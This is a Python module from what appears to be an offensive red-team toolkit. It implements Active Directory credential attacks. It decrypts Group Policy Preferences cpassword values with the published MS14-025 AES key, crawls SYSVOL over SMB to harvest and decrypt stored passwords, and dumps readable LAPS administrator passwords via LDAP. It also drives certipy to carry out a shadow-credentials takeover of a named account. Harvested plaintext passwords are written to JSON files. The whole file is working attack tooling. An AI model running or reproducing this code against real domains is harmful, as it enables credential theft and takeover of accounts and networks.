# language: Python, file: Program/ad_attack/credentials.py, target: Red Sky ad_attack — credential primitives
# Three AD credential tricks in one place:
#   1. GPP cpassword — decrypt the AES key Microsoft published by accident
#   2. LAPS password read — pull ms-Mcs-AdmPwd / msLAPS-Password from readable computers
#   3. Shadow Credentials — write msDS-KeyCredentialLink, obtain a certificate, auth as the target
#   4. SYSVOL cpassword scrape — walk SYSVOL for Groups.xml / Services.xml / ScheduledTasks.xml

import base64
import json
import sys
import time
from pathlib import Path
from typing import Dict, List

from Program.theme.palette import SCARLET, ARTERY, BONE, ASH, OK, CLOT, RESET, BOLD
from Program.utils import print_ok, print_err, print_info, print_warn, print_kv
from Program.utils.paths import OUTPUT_DIR


AD_DIR = OUTPUT_DIR / "ad_attack"


# Microsoft published this key in MS14-025. It's public. It's the whole point of GPP being insecure.
GPP_AES_KEY = bytes.fromhex("4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b")


def decrypt_cpassword(cpassword_b64: str) -> str:
    """Decrypt a GPP cpassword field using the leaked MS14-025 AES key."""
    try:
        from Crypto.Cipher import AES
    except ImportError:
        try:
            from Cryptodome.Cipher import AES
        except ImportError:
            print_err("pycryptodome required for cpassword decryption")
            print_info("  pip install --break-system-packages pycryptodome")
            return ""
    try:
        data = base64.b64decode(cpassword_b64 + "=" * (-len(cpassword_b64) % 4))
        cipher = AES.new(GPP_AES_KEY, AES.MODE_CBC, b"\x00" * 16)
        plain = cipher.decrypt(data)
        # strip PKCS7 padding
        pad_len = plain[-1]
        if 1 <= pad_len <= 16:
            plain = plain[:-pad_len]
        return plain.decode("utf-16-le", errors="replace")
    except Exception as e:
        print_err(f"decrypt failed: {e}")
        return ""


def _connect(host, domain, user, passwd, ssl=False):
    try:
        import ldap3
    except ImportError:
        print_err("ldap3 not installed")
        return None, None
    port = 636 if ssl else 389
    server = ldap3.Server(host, port=port, get_info=ldap3.ALL, connect_timeout=10)
    try:
        conn = ldap3.Connection(
            server,
            user=f"{domain}\\{user}" if "\\" not in user else user,
            password=passwd,
            authentication=ldap3.NTLM,
            auto_bind=True,
            receive_timeout=15,
        )
    except Exception as e:
        print_err(f"LDAP bind failed: {e}")
        return None, None
    return server, conn


def _base_dn(domain):
    return ",".join(f"DC={p}" for p in domain.split(".") if p)


def cmd_cpassword(cpassword: str) -> int:
    print_info("decrypting GPP cpassword")
    print_kv("ciphertext", cpassword[:60] + ("…" if len(cpassword) > 60 else ""))
    plain = decrypt_cpassword(cpassword)
    if plain:
        print_ok(f"plaintext: {plain}")
        return 0
    print_err("decryption failed")
    return 1


def cmd_sysvol(host, domain, user, passwd) -> int:
    """Walk SYSVOL for any XML with a cpassword attribute, decrypt all."""
    AD_DIR.mkdir(parents=True, exist_ok=True)
    print_info("walking SYSVOL for GPP files")

    try:
        from impacket.smbconnection import SMBConnection
    except ImportError:
        print_err("impacket required for SYSVOL walk")
        return 1

    try:
        conn = SMBConnection(host, host, timeout=15)
        conn.login(user, passwd, domain)
    except Exception as e:
        print_err(f"SMB login failed: {e}")
        return 1

    # SYSVOL path
    shares = ["SYSVOL"]
    found = []

    try:
        for share in shares:
            # walk the Policies folder — that's where Groups.xml lives
            base = "\\Policies"
            try:
                for path in _walk_smb(conn, share, base):
                    low = path.lower()
                    if low.endswith((".xml", ".inf")):
                        try:
                            data = _read_smb(conn, share, path)
                            text = data.decode("utf-16", errors="replace") + data.decode("utf-8", errors="replace")
                            if "cpassword" in text:
                                import re
                                for m in re.finditer(r'cpassword="([^"]+)"', text):
                                    cp = m.group(1)
                                    plain = decrypt_cpassword(cp)
                                    found.append({
                                        "path": f"\\\\{host}\\{share}{path}",
                                        "cpassword": cp,
                                        "plaintext": plain,
                                    })
                                    print_ok(f"{path}")
                                    print(f"      {ASH}cpassword: {cp[:40]}…{RESET}")
                                    if plain:
                                        print(f"      {BONE}plaintext: {plain}{RESET}")
                        except Exception:
                            continue
            except Exception:
                pass
    finally:
        try:
            conn.logoff()
        except Exception:
            pass

    if not found:
        print_warn("no GPP cpassword hits in SYSVOL")

    out = AD_DIR / f"gpp_{domain}_{int(time.time())}.json"
    out.write_text(json.dumps(found, indent=2))
    print()
    print_kv("saved", out)
    return 0


def _walk_smb(conn, share, path):
    """Recursive SYSVOL walk."""
    try:
        files = conn.listPath(share, path)
    except Exception:
        return
    for f in files:
        if f.get_longname() in (".", ".."):
            continue
        p = f"{path}\\{f.get_longname()}"
        if f.is_directory():
            yield from _walk_smb(conn, share, p)
        else:
            yield p


def _read_smb(conn, share, path):
    import io
    buf = io.BytesIO()
    try:
        conn.getFile(share, path, buf.write)
    except Exception:
        return b""
    return buf.getvalue()


def cmd_laps(host, domain, user, passwd, ssl=False, out_file="") -> int:
    """Find computers whose LAPS password this user can read."""
    AD_DIR.mkdir(parents=True, exist_ok=True)
    print_info("enumerating readable LAPS passwords")

    server, conn = _connect(host, domain, user, passwd, ssl)
    if not conn:
        return 1
    base = _base_dn(domain)

    hits = []
    for attr in ("ms-Mcs-AdmPwd", "msLAPS-Password", "msLAPS-EncryptedPassword"):
        try:
            conn.search(base, f"({attr}=*)",
                        attributes=["sAMAccountName", "distinguishedName", attr,
                                    "ms-Mcs-AdmPwdExpirationTime", "msLAPS-PasswordExpirationTime"],
                        paged_size=500)
            for e in conn.entries:
                pw = str(e[attr].value or "")
                if pw:
                    hits.append({
                        "computer": str(e["sAMAccountName"].value or ""),
                        "dn": e.entry_dn,
                        "attribute": attr,
                        "password": pw,
                    })
                    print(f"  {SCARLET}▓{RESET} {BONE}{hits[-1]['computer']}{RESET}  "
                          f"{ASH}{attr}{RESET}  {pw}")
        except Exception:
            continue

    conn.unbind()

    if not hits:
        print_warn("no readable LAPS passwords")

    out = Path(out_file) if out_file else AD_DIR / f"laps_{domain}_{int(time.time())}.json"
    out.write_text(json.dumps(hits, indent=2, default=str))
    print()
    print_kv("saved", out)
    return 0


def cmd_shadow(host, domain, user, passwd, target_sam, ssl=False) -> int:
    """Shell out to certipy for shadow credentials (msDS-KeyCredentialLink abuse)."""
    import shutil
    if not shutil.which("certipy"):
        print_err("certipy not installed")
        print_info("  pip install --break-system-packages certipy-ad")
        return 1

    print_info(f"shadow credentials attack on {target_sam}")
    print_kv("target", target_sam)

    cmd = [
        "certipy", "shadow", "auto",
        "-u", f"{user}@{domain}",
        "-p", passwd,
        "-account", target_sam,
        "-dc-ip", host,
    ]
    if ssl:
        cmd.append("-ldap-ssl")

    import subprocess
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=180)
    except (subprocess.SubprocessError, FileNotFoundError) as e:
        print_err(f"certipy shadow failed: {e}")
        return 1
    for line in (r.stdout + r.stderr).splitlines():
        print(f"  {ASH}{line[:140]}{RESET}")
    return 0 if r.returncode == 0 else 1


def run_cli(args):
    import argparse
    p = argparse.ArgumentParser(prog="redsky ad_attack credentials", add_help=False)
    p.add_argument("-h", "--help", action="store_true")
    p.add_argument("action", nargs="?", default="")
    p.add_argument("--cpassword", default="")
    p.add_argument("--dc", default="")
    p.add_argument("--domain", default="")
    p.add_argument("--user", default="")
    p.add_argument("--pass", dest="passwd", default="")
    p.add_argument("--ssl", action="store_true")
    p.add_argument("--out", default="")
    p.add_argument("--account", default="")

    try:
        ns = p.parse_args(args)
    except SystemExit:
        print_err("usage: redsky ad_attack credentials <cpassword|sysvol|laps|shadow> [args]")
        return 2

    if ns.help:
        print_info("redsky ad_attack credentials cpassword --cpassword <b64>")
        print_info("redsky ad_attack credentials sysvol --dc DC --domain D --user U --pass P")
        print_info("redsky ad_attack credentials laps --dc DC --domain D --user U --pass P [--ssl]")
        print_info("redsky ad_attack credentials shadow --dc DC --domain D --user U --pass P --account SAM")
        return 0

    if ns.action == "cpassword":
        if not ns.cpassword:
            print_err("cpassword needs --cpassword <b64>")
            return 2
        return cmd_cpassword(ns.cpassword)
    if ns.action == "sysvol":
        if not all([ns.dc, ns.domain, ns.user, ns.passwd]):
            print_err("--dc --domain --user --pass are required")
            return 2
        return cmd_sysvol(ns.dc, ns.domain, ns.user, ns.passwd)
    if ns.action == "laps":
        if not all([ns.dc, ns.domain, ns.user, ns.passwd]):
            print_err("--dc --domain --user --pass are required")
            return 2
        return cmd_laps(ns.dc, ns.domain, ns.user, ns.passwd, ns.ssl, ns.out)
    if ns.action == "shadow":
        if not all([ns.dc, ns.domain, ns.user, ns.passwd, ns.account]):
            print_err("shadow needs --dc --domain --user --pass --account")
            return 2
        return cmd_shadow(ns.dc, ns.domain, ns.user, ns.passwd, ns.account, ns.ssl)

    print_err(f"unknown credentials action: {ns.action}")
    return 2


if __name__ == "__main__":
    sys.exit(run_cli(sys.argv[1:]))
